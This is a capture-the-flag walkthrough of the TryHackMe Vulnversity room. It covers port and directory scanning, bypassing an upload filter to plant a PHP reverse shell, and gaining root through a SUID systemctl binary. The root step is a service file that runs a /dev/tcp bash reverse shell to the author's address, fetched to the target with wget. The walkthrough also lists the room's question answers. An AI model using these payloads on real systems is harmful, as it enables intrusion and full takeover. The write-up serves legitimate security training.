# VulnUniversity

- [Tools](#tools)
- [Deploy the machine](#deploy-the-machine)
- [Reconnaissance](#reconnaissance)
- [Locating directories using Gobuster](#locating-directories-using-gobuster)
- [Privilege Escalation](#privilege-escalation)

Room Link: [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

## Tools 

1. [NMap](https://nmap.org/download) 
2. [Gobuster](https://github.com/OJ/gobuster) 
3. [Burp Intruder](https://portswigger.net/burp) 
4. [Burp Proxy Toggle Extension](https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/)

## Deploy the machine 

1. Deploy The Machine by clicking Start The Machine
2. Download ovpn file and connect to the network using command `sudo openvpn --config username.ovpn`.

## Reconnaissance

1. Scan ports of the machine with given command `nmap -sV 10.10.65.81`
Output of the command:
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-26 09:55 IST
Nmap scan report for 10.10.135.130
Host is up (0.20s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
```
3. Question `how many ports are open?` Answer `6`
4. Question `What version of the squid proxy is running on the machine?` Answer `3.5.12`
5. Question `How many ports will Nmap scan if the flag -p-400 was used?` Answer `400`
6. Question `What is the most likely operating system this machine is running?` Answer `Ubuntu`
7. Question `What port is the web server running on?` Answer `3333`
8. Question `What is the flag for enabling verbose mode using Nmap?` Answer `-v`

## Locating directories using Gobuster 
   
1. Port 3333 is http server, So web interface looks like that http://10.10.65.81:3333
2. We can run directory busting tool gobuster as per given command with our own wordlist `gobuster dir -u http://10.10.65.81:3333 -w /usr/share/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt`
Output of the command: 
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.81:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.65.81:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.65.81:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.65.81:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.65.81:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.65.81:3333/internal/]
Progress: 9932 / 1273834 (0.78%)
```
3. Question `What is the directory that has an upload form page?` Answer `/internal/`

## Compromise the Webserver 

1. Question `What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.` Answer `.php`
2. Run burpsuite as per instruction and user intruder. Use firefox extension, https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/
3. Question `Run this attack, what extension is allowed?` Answer `.phtml`
4. Now we need to make our shell with given instruction using https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php. Just replace ip to our netcat listening ip (tun0) and file extension to `.phtml`. Use `nc -lvnp 1234` to get shell.
5. Now just upload the file and open http://10.10.65.81:3333/internal/uploads/ and click on the shell to get reverse shell.
6. Question `What is the name of the user who manages the webserver?` Answer `bill`. Use `ls /home` command to get username.
7. Question `What is the user flag?` Answer `********************************` (32 alphanumeric characters). Command used `cat /home/bill/user.txt`

## Privilege Escalation 

1. To check suid permission files, we can use `find / -perm /4000 2> /dev/null`.
2. Question `On the system, search for all SUID files. Which file stands out?` Answer `/bin/systemctl` Because systemctl don't have suid permission normally.
3. Now we can start rooting the server.
4. At first I created a file on my machine named ZishanAdThander.service (with my ip, you can user your ip)
```bash
[Unit]
Description=ZishanAdThandar

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.102.105/1337 0>&1'

[Install]
WantedBy=multi-user.target
```
5. Now started web server on my machine using `python3 -m http.server 7860`
6. On the reverse shell, moved to `/tmp` directory using `cd /tmp` command. Then uploaded the file with `wget http://10.17.102.105:7860/ZishanAdThandar.service` command.
7. Now we can add the service using `/bin/systemctl enable /tmp/ZishanAdThandar.service` command on reverse shell.
8. Started netcat listner on the given port with `nc -lvnp 1337`.
9. Now we need can run the command `/bin/systemctl start ZishanAdThandar` to start the service and immediately we will get reverse shell as root on another netcat listner.
10. Question `Become root and get the last flag (/root/root.txt)` Answer `********************************` (32 alphanumeric characters). Command used `cat /root/root.txt`

    
Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)




